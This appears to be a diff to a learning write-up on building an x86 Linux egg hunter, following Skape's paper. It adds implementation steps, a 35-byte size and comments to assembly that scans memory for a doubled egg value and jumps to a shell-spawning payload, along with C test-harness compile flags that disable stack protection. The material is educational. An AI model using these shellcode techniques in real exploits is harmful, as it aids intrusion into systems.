@@ -35,6 +35,13 @@ The popular paper by Skape was referenced to better understand the implementatio
 
 [skape-link]: http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf
 
+In summary, the following steps will be implemented:
+
+* Generate shellcode
+* Define egg value
+* Define Egg Hunter
+* Generate customized shellcode
+
 #### Access Syscall
 ----
 
@@ -115,7 +122,7 @@ Note is made of the fact that EFAULT (0xf2) should be avoided, as the error stat
 ; Purpose: Egghunter, spawning a shell on the local host
 ; Compilation: ./compile.sh egghunter
 ; Usage: ./egghunter
-; Shellcode size: ?? bytes
+; Shellcode size: 35 bytes
 ; Architecture: x86
 
 global   _start
@@ -140,8 +147,12 @@ section .text
 	jz next_page		; if EFAULT is encountered, jump back to next_page 
 	mov eax, 0x50905090	; move unique egg value into eax
 	mov edi, edx
+	
+	; search for the egg
 	scasd			; search for first 4 byte pattern of the egg
 	jnz next_address
+	
+	; search again for 2nd copy of the egg 
 	scasd			; search for second 4 byte pattern of the egg
 	jnz next_address
 	jmp edi			; jump to egg payload
@@ -213,7 +224,7 @@ The following C skeleton code will be used to demonstrate the Egg Hunter from a 
 * Purpose: Egghunter, spawning a shell on the local host  
 * Compilation: gcc -fno-stack-protector -z execstack -m32 shellcode.c -o egghunter_final  
 * Usage: ./egghunter_final
-* Shellcode size: ?? bytes
+* Shellcode size: 35 bytes
 * Architecture: x86
 **/
 
